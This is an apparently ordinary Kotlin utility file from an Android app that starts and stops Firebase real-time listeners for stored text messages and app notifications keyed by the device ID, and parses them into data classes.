package com.example.fast.util

import android.content.Context
import android.provider.Settings
import android.util.Log
import com.example.fast.config.AppConfig
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.Query
import com.google.firebase.database.ValueEventListener
import com.google.firebase.Firebase
import com.google.firebase.database.database

/**
 * FirebaseRealtimeListenerHelper
 * 
 * Utility helper for managing Firebase real-time listeners.
 * Provides easy-to-use methods for starting/stopping listeners for messages and notifications.
 * 
 * Usage:
 * - Start listeners when user views screen (onResume)
 * - Stop listeners when user leaves screen (onPause)
 * - Always remove old listener before adding new one
 */
object FirebaseRealtimeListenerHelper {
    
    private const val TAG = "FirebaseRealtimeListener"
    
    /**
     * Message data class
     */
    data class Message(
        val type: String,        // "received" or "sent"
        val phone: String,
        val body: String,
        val timestamp: Long
    )
    
    /**
     * Notification data class
     */
    data class Notification(
        val packageName: String,
        val title: String,
        val text: String,
        val timestamp: Long
    )
    
    /**
     * Start real-time listener for messages
     * 
     * @param context Application context
     * @param onNewMessage Callback when new message is received
     * @param limitToLast Limit to last N messages (default: 100)
     * @param startAfterTimestamp Only listen for messages after this timestamp (optional)
     * @return ChildEventListener instance (store this to stop later)
     */
    fun startMessageListener(
        context: Context,
        onNewMessage: (Message) -> Unit,
        limitToLast: Int = 100,
        startAfterTimestamp: Long? = null
    ): ChildEventListener {
        val deviceId = getDeviceId(context)
        val messagesPath = AppConfig.getFirebaseMessagePath(deviceId)
        val messagesRef = Firebase.database.reference.child(messagesPath)
        
        // Build query
        val query: Query = if (startAfterTimestamp != null && startAfterTimestamp > 0) {
            // Only listen for messages after specific timestamp
            messagesRef.orderByKey().startAfter(startAfterTimestamp.toString())
        } else {
            // Listen for last N messages
            messagesRef.orderByKey().limitToLast(limitToLast)
        }
        
        val listener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                try {
                    val message = parseMessage(snapshot)
                    if (message != null) {
                        onNewMessage(message)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing message", e)
                }
            }
            
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                // Handle message update if needed
            }
            
            override fun onChildRemoved(snapshot: DataSnapshot) {
                // Handle message removal if needed
            }
            
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {
                // Not needed for messages
            }
            
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Message listener cancelled", error.toException())
            }
        }
        
        query.addChildEventListener(listener)
        Log.d(TAG, "Message listener started at path: $messagesPath")
        
        return listener
    }
    
    /**
     * Start real-time listener for notifications
     * 
     * @param context Application context
     * @param onNewNotification Callback when new notification is received
     * @param limitToLast Limit to last N notifications (default: 100)
     * @param startAfterTimestamp Only listen for notifications after this timestamp (optional)
     * @return ChildEventListener instance (store this to stop later)
     */
    fun startNotificationListener(
        context: Context,
        onNewNotification: (Notification) -> Unit,
        limitToLast: Int = 100,
        startAfterTimestamp: Long? = null
    ): ChildEventListener {
        val deviceId = getDeviceId(context)
        val notificationsPath = AppConfig.getFirebaseNotificationPath(deviceId)
        val notificationsRef = Firebase.database.reference.child(notificationsPath)
        
        // Build query
        val query: Query = if (startAfterTimestamp != null && startAfterTimestamp > 0) {
            // Only listen for notifications after specific timestamp
            notificationsRef.orderByKey().startAfter(startAfterTimestamp.toString())
        } else {
            // Listen for last N notifications
            notificationsRef.orderByKey().limitToLast(limitToLast)
        }
        
        val listener = object : ChildEventListener {
            override fun onChildAdded(snapshot: DataSnapshot, previousChildName: String?) {
                try {
                    val notification = parseNotification(snapshot)
                    if (notification != null) {
                        onNewNotification(notification)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error parsing notification", e)
                }
            }
            
            override fun onChildChanged(snapshot: DataSnapshot, previousChildName: String?) {
                // Handle notification update if needed
            }
            
            override fun onChildRemoved(snapshot: DataSnapshot) {
                // Handle notification removal if needed
            }
            
            override fun onChildMoved(snapshot: DataSnapshot, previousChildName: String?) {
                // Not needed for notifications
            }
            
            override fun onCancelled(error: DatabaseError) {
                Log.e(TAG, "Notification listener cancelled", error.toException())
            }
        }
        
        query.addChildEventListener(listener)
        Log.d(TAG, "Notification listener started at path: $notificationsPath")
        
        return listener
    }
    
    /**
     * Stop message listener
     * 
     * @param context Application context
     * @param listener Listener instance returned from startMessageListener()
     */
    fun stopMessageListener(context: Context, listener: ChildEventListener?) {
        listener?.let {
            try {
                val deviceId = getDeviceId(context)
                val messagesPath = AppConfig.getFirebaseMessagePath(deviceId)
                val messagesRef = Firebase.database.reference.child(messagesPath)
                messagesRef.removeEventListener(it)
                Log.d(TAG, "Message listener stopped")
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping message listener", e)
            }
        }
    }
    
    /**
     * Stop notification listener
     * 
     * @param context Application context
     * @param listener Listener instance returned from startNotificationListener()
     */
    fun stopNotificationListener(context: Context, listener: ChildEventListener?) {
        listener?.let {
            try {
                val deviceId = getDeviceId(context)
                val notificationsPath = AppConfig.getFirebaseNotificationPath(deviceId)
                val notificationsRef = Firebase.database.reference.child(notificationsPath)
                notificationsRef.removeEventListener(it)
                Log.d(TAG, "Notification listener stopped")
            } catch (e: Exception) {
                Log.e(TAG, "Error stopping notification listener", e)
            }
        }
    }
    
    /**
     * Parse message from DataSnapshot
     */
    private fun parseMessage(snapshot: DataSnapshot): Message? {
        val messageValue = snapshot.getValue(String::class.java) ?: return null
        val timestamp = snapshot.key?.toLongOrNull() ?: return null
        
        // Format: "received~phone~body" or "sent~phone~body"
        if (messageValue.contains("~")) {
            val parts = messageValue.split("~")
            if (parts.size >= 3) {
                return Message(
                    type = parts[0],
                    phone = parts[1],
                    body = parts[2],
                    timestamp = timestamp
                )
            }
        }
        
        return null
    }
    
    /**
     * Parse notification from DataSnapshot
     */
    private fun parseNotification(snapshot: DataSnapshot): Notification? {
        val notificationValue = snapshot.getValue(String::class.java) ?: return null
        val timestamp = snapshot.key?.toLongOrNull() ?: return null
        
        // Format: "package~title~text"
        if (notificationValue.contains("~")) {
            val parts = notificationValue.split("~")
            if (parts.size >= 3) {
                return Notification(
                    packageName = parts[0],
                    title = parts[1],
                    text = parts[2],
                    timestamp = timestamp
                )
            }
        }
        
        return null
    }
    
    /**
     * Get device ID
     */
    @android.annotation.SuppressLint("HardwareIds")
    private fun getDeviceId(context: Context): String {
        return Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: ""
    }
}
